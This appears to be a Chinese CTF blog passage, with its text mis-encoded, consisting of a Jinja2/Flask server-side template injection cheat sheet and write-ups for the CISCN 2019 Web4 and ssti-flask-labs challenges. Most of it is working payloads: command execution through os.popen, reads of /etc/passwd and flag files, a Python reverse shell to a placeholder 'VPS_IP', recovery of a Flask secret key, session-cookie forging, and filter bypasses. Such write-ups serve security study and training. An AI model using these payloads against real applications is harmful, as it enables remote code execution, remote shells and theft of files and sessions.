<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[]</span><span class="selector-class">.__class__</span><span class="selector-class">.__bases__</span><span class="selector-attr">[0]</span><span class="selector-class">.__subclasses__</span>()<span class="selector-attr">[NUM]</span><span class="selector-attr">[<span class="string">&quot;get_data&quot;</span>]</span>(<span class="number">0</span>,&quot;/etc/passwd&quot;)</span><br></pre></td></tr></table></figure></div>
<p>å…¶ä»–æ–‡ä»¶è¯»å–çš„æ–¹æ³•æ— éè¿˜æ˜¯åœ¨å‘½ä»¤æ‰§è¡Œçš„åŸºç¡€ä¸Šå»å¯¼å…¥æ–‡ä»¶æ“ä½œçš„åŒ…</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">- codecsæ¨¡å—</span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;codecs&#x27;).open(&#x27;/app/flag&#x27;).read()&quot;</span>) </span><br><span class="line"></span><br><span class="line">- pathlibæ¨¡å—</span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;pathlib&#x27;).Path(&#x27;/app/flag&#x27;).read_text()&quot;</span>) </span><br><span class="line"></span><br><span class="line">- ioæ¨¡å—</span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;io&#x27;).open(&#x27;/app/flag&#x27;).read()&quot;</span>)</span><br><span class="line"></span><br><span class="line">- <span class="built_in">open</span>å‡½æ•°</span><br><span class="line">x[NUM].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;open(&#x27;/app/flag&#x27;).read()&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<h3 id="æ¢ç´¢"><a href="#æ¢ç´¢" class="headerlink" title="æ¢ç´¢"></a>æ¢ç´¢</h3><p>å†…å»ºå‡½æ•°æœ‰å¾ˆå¤šå¯ç”¨çš„æ–¹æ³•ï¼Œå¯ä»¥å–å‡º<code>__builtins__</code>ä¸­çš„å†…å®¹ ç„¶åå¯»æ‰¾æ–‡ä»¶å’Œå‘½ä»¤ç›¸å…³çš„å‡½æ•°ï¼Œå¯ä»¥åœ¨pythonçš„å®˜æ–¹æ–‡æ¡£ä¸­æ‰¾åˆ°<a href="https://docs.python.org/zh-cn/3/library/functions.html">å†…ç½®å‡½æ•°</a></p>
<h2 id="Jinja-SSTI-å¤‡å¿˜å½•"><a href="#Jinja-SSTI-å¤‡å¿˜å½•" class="headerlink" title="Jinja SSTI å¤‡å¿˜å½•"></a>Jinja SSTI å¤‡å¿˜å½•</h2><h3 id="åŸºç±»"><a href="#åŸºç±»" class="headerlink" title="åŸºç±»"></a>åŸºç±»</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bases ä¼šè¿”å›å…ƒç»„å½¢å¼ </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__bases__[<span class="number">0</span>] == __base__</span><br><span class="line"><span class="comment">#å› ä¸º mro ä¼šæ˜¾ç¤ºç»§æ‰¿é¡ºåºï¼Œè€Œæ‰€æœ‰ç±»æœ€ç»ˆéƒ½ç»§æ‰¿è‡ªä¸€ä¸ªç‰¹æ®Šçš„åŸºç±» objectï¼Œæ‰€ä»¥ __mro__[-1] æ€»æ˜¯èƒ½æ‹¿åˆ°åŸºç±»</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__base__*N == __mro__[-<span class="number">1</span>] </span><br><span class="line"></span><br><span class="line">[].__class__.__base__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line"></span><br><span class="line">request.__class__.__mro__[-<span class="number">1</span>] <span class="comment"># éœ€è¦å¯¼å…¥è¿‡ request æ¨¡å—</span></span><br><span class="line"><span class="built_in">dict</span>.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">config.__class__.__base__.__base__</span><br><span class="line">config.__class__.__base__.__base__</span><br></pre></td></tr></table></figure></div>
<h3 id="é€šç”¨-payload-Python3"><a href="#é€šç”¨-payload-Python3" class="headerlink" title="é€šç”¨ payload ( Python3 )"></a>é€šç”¨ payload ( Python3 )</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å‘½ä»¤æ‰§è¡Œ_eval</span></span><br><span class="line"> &#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> x.__init__ <span class="keyword">is</span> defined <span class="keyword">and</span> x.__init__.__globals__ <span class="keyword">is</span> defined <span class="keyword">and</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>].__name__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘½ä»¤æ‰§è¡Œ_os.py</span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> x.__init__ <span class="keyword">is</span> defined <span class="keyword">and</span> x.__init__.__globals__ <span class="keyword">is</span> defined <span class="keyword">and</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read() &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘½ä»¤æ‰§è¡Œ_popen</span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> x.__init__ <span class="keyword">is</span> defined <span class="keyword">and</span> x.__init__.__globals__ <span class="keyword">is</span> defined <span class="keyword">and</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read() &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘½ä»¤æ‰§è¡Œ__frozen_importlib.BuiltinImporter</span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;BuiltinImporter&#x27;</span> <span class="keyword">in</span> x.__name__ %&#125;</span><br><span class="line">        &#123;&#123; x[<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls /&quot;</span>).read() &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘½ä»¤æ‰§è¡Œ_linecache</span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> x.__init__ <span class="keyword">is</span> defined <span class="keyword">and</span> x.__init__.__globals__ <span class="keyword">is</span> defined <span class="keyword">and</span> <span class="string">&#x27;linecache&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read() &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘½ä»¤æ‰§è¡Œ_exec(æ— å›æ˜¾æ•…åå¼¹shell)</span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> x.__init__ <span class="keyword">is</span> defined <span class="keyword">and</span> x.__init__.__globals__ <span class="keyword">is</span> defined <span class="keyword">and</span> <span class="string">&#x27;exec&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>].__name__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;HOST_IP&quot;,Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span>)&#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">216</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;VPS_IP&quot;,ç«¯å£));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘½ä»¤æ‰§è¡Œ_catch_warnings </span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> <span class="string">&#x27;war&#x27;</span> <span class="keyword">in</span> x.__name__ %&#125;&#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># catch_warnings è¯»å–æ–‡ä»¶</span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> x.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/app/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># _frozen_importlib_external.FileLoader è¯»å–æ–‡ä»¶</span></span><br><span class="line"> &#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125; <span class="comment"># &#123;% for x in [].__class__.__bases__[0].__subclasses__() %&#125;</span></span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;FileLoader&#x27;</span> <span class="keyword">in</span> x.__name__ %&#125;</span><br><span class="line">        &#123;&#123; x[<span class="string">&quot;get_data&quot;</span>](<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)&#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…¶ä»–RCE</span></span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;g.pop.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;lipsum.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;application.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="variable language_">self</span>.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;cycler.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;joiner.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;namespace.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__.current_app.add_url_rule(<span class="string">&#x27;/1333337&#x27;</span>,view_func=url_for.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read)&#125;&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="è¯†åˆ«æµç¨‹"><a href="#è¯†åˆ«æµç¨‹" class="headerlink" title="è¯†åˆ«æµç¨‹"></a>è¯†åˆ«æµç¨‹</h3><p><img src="https://pic1.imgdb.cn/item/67d43f4088c538a9b5bdb473.png"><br><code>&#123;&#123;7*'7'&#125;&#125;</code>åœ¨ Twig ä¸­è¿”å›49 ï¼Œåœ¨ Jinja2 ä¸­è¿”å›7777777</p>
<h3 id="è¿‡æ»¤å™¨"><a href="#è¿‡æ»¤å™¨" class="headerlink" title="è¿‡æ»¤å™¨"></a>è¿‡æ»¤å™¨</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.raingray.com<span class="regexp">/archives/</span><span class="number">4183</span>.html</span><br><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">11090</span><span class="comment">#toc-6</span></span><br><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">9584</span><span class="comment">#toc-6</span></span><br><span class="line">https:<span class="regexp">//</span>zhuanlan.zhihu.com<span class="regexp">/p/</span><span class="number">618277583</span></span><br><span class="line">https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/2301_77485708/</span>article<span class="regexp">/details/</span><span class="number">132467976</span></span><br><span class="line">https:<span class="regexp">//</span>cloud.tencent.com<span class="regexp">/developer/</span>article/<span class="number">2287431</span></span><br><span class="line">https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/Manuffer/</span>article<span class="regexp">/details/</span><span class="number">120739989</span></span><br><span class="line">https:<span class="regexp">//</span>tttang.com<span class="regexp">/hc-archive1698/</span><span class="comment">#toc__5</span></span><br><span class="line">https:<span class="regexp">//</span>jinja.palletsprojects.com<span class="regexp">/en/</span>latest<span class="regexp">/templates/</span></span><br><span class="line">https:<span class="regexp">//</span>docs.python.org<span class="regexp">/zh-cn/</span><span class="number">3</span><span class="regexp">/library/</span>functions.html</span><br></pre></td></tr></table></figure></div>

<h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="nssctf-CISCN-2019åä¸œå—-Web4"><a href="#nssctf-CISCN-2019åä¸œå—-Web4" class="headerlink" title="nssctf  [CISCN 2019åä¸œå—]Web4"></a>nssctf  [CISCN 2019åä¸œå—]Web4</h2><p><img src="https://pic1.imgdb.cn/item/67d4300f88c538a9b5bdb014.png"><br>å‘ç°è¿™é‡Œæ˜¯ç”¨&#x2F;read?url&#x3D;xxx å¯ä»¥å…ˆéªŒè¯æœ‰æ²¡æœ‰ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´, ç”¨&#x2F;etc&#x2F;passwdå°è¯•å‘ç°çœŸçš„æœ‰<br>ç„¶åè¾“å…¥&#x2F;proc&#x2F;self&#x2F;cmdline è¿™ä¸ªæ–‡ä»¶æ˜¯è¯»å–å½“å‰è¿›ç¨‹çš„å‘½ä»¤ è¿”å›<code>/usr/local/bin/python/app/app.py</code> è¯´æ˜è¿™ä¸ªæ˜¯ä¸€ä¸ªflaskæ¡†æ¶çš„é¢˜ç›®<br>è¿™ä¸ªreadåŠŸèƒ½ä¹Ÿæ˜¯ä¸€ä¸ªè·¯ç”±ï¼Œè®¿é—®app.pyåªè¦urlä¸­è¾“å…¥app.pyï¼Œå¾—åˆ°æºç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®éšæœºç§å­</span></span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! Read somethings&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">r&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">r&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line"></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session.get(<span class="string">&#x27;username&#x27;</span>) == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p><code>/</code>è·¯ç”±ä¸­ä¼šè®¾ç½®<code>session[&#39;username&#39;] = &#39;www-data&#39;</code> flagè·¯ç”±ä¸­å¦‚æœsessionä¸­çš„usernameæ˜¯fuckå°±èƒ½å¾—åˆ°flag<br>uuid.getnode()è¿™ä¸ªå‡½æ•°æ˜¯è·å–macåœ°å€ ä½†æ˜¯éšæœºç§å­ä¸€èˆ¬æ˜¯ä¸ªä½æ•°ï¼Œç„¶åæŠŠæ•°æ®è½¬æˆåå…­è¿›åˆ¶<br>åœ¨&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;addressä¸­å¾—åˆ°macåœ°å€ <code>02:42:ac:02:56:ed</code> -&gt; <code>0x0242ac0256ed</code><br>ä½†æ˜¯è¦æ³¨æ„ç”¨python2æ‰§è¡Œï¼Œå¾—åˆ°SECRET_KEY</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">0x0242ac0256ed</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random() * <span class="number">233</span>))<span class="comment">#176.896276856</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åç”¨flask-session-cookie-managerå·¥å…·ç”Ÿæˆsessionå€¼</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">(base) kakeru@bogon flask-session-cookie-manager-<span class="keyword">master</span> <span class="title">% python3</span> flask_session_cookie_manager3.py encode -s <span class="number">176.896276856</span> -t <span class="string">&quot;&#123;&#x27;username&#x27;:&#x27;fuck&#x27;&#125;&quot;</span></span><br><span class="line">eyJ1c2VybmFtZSI6ImZ1Y2sifQ.Z9Q02Q.BwRGhQnimBzqix5uXVI21w1xL_0</span><br></pre></td></tr></table></figure></div>
<p>æŠŠç½‘é¡µä¸­çš„sessionå€¼ä¿®æ”¹æˆè¿™ä¸ªï¼Œç„¶åè®¿é—®flagè·¯ç”±å¾—åˆ°flag<br><img src="https://pic1.imgdb.cn/item/67d4353588c538a9b5bdb15c.png"></p>
<h2 id="nssctf-ssti-flask-labs"><a href="#nssctf-ssti-flask-labs" class="headerlink" title="nssctf ssti-flask-labs"></a>nssctf ssti-flask-labs</h2><p><img src="https://pic1.imgdb.cn/item/67d441d088c538a9b5bdb528.png"><br>è¿™å°±æ˜¯ä¸€ä¸ªsstiçš„é¶åœºï¼Œå¯ä»¥ç»ƒä¹ ä¸åŒçš„sstiçš„ç»•è¿‡å§¿åŠ¿<br>ä»æœ€ç®€å•çš„æ²¡æœ‰wafå¼€å§‹ï¼Œå°±æ˜¯ç›´æ¥ç”¨åˆšæ‰çš„é€šç”¨payloadï¼Œéå†æ‰¾åˆ°ä¸€ä¸ªæœ‰evalçš„å†…å»ºå‡½æ•°ï¼Œç„¶åè°ƒç”¨evalå°±å¯ä»¥äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> x.__init__ <span class="keyword">is</span> defined <span class="keyword">and</span> x.__init__.__globals__ <span class="keyword">is</span> defined <span class="keyword">and</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>].__name__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿˜å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªå‘½ä»¤æ¥çˆ†ç ´å‡ºæ˜¯subclassesä¸­çš„å“ªä¸€ä¸ªï¼Œä¾¿äºä¸‹é¢çš„è¿‡æ»¤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HANDLEBARS"><figure class="iseeu highlight /handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[x].__init__.__globals__[&#x27;__import__&#x27;](<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">&#x27;env&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml">#ç›¸å½“äºæ‰§è¡Œ import os; os.popen(&#x27;env&#x27;)</span></span><br></pre></td></tr></table></figure></div>
<p>æ€»ç»“ä¸‹åé¢çš„è¿‡æ»¤å§¿åŠ¿</p>
<ul>
<li>è¿‡æ»¤ ï¼ˆè¿ç»­ä¸¤ä¸ªå¤§æ‹¬å·ï¼‰ ç”¨<code>&#123;% %&#125;</code> <code>&#123;%print payload %&#125;</code></li>
<li>è¾“å‡ºå†…å®¹æ— å›æ˜¾  æŠŠå†…å®¹å†™åˆ°å¦ä¸€ä¸ªå¯ä»¥è®¿é—®åˆ°çš„ç›®å½•ï¼Œç„¶åè®¿é—®è¿™ä¸ªç›®å½•</li>
<li>è¿‡æ»¤ä¸­æ‹¬å· åˆ©ç”¨Python ä¸­åˆ—è¡¨ä¸­æ‹¬å·è®¿é—®æŒ‡å®šä¸‹æ ‡å…ƒç´ å®é™…ä¸Šæ˜¯è°ƒç”¨äº†åˆ—è¡¨çš„ <code>__getitem__()</code> æ–¹æ³•ï¼Œå­—å…¸ä¹Ÿå®ç°äº†è¿™ä¸ªé­”æœ¯æ–¹æ³• ç”¨è¿™ä¸ªæ–¹æ³•ä»£æ›¿ä¸­æ‹¬å·</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">80</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;env&#x27;</span>).read()&#125;&#125; </span><br></pre></td></tr></table></figure></div>
<ul>
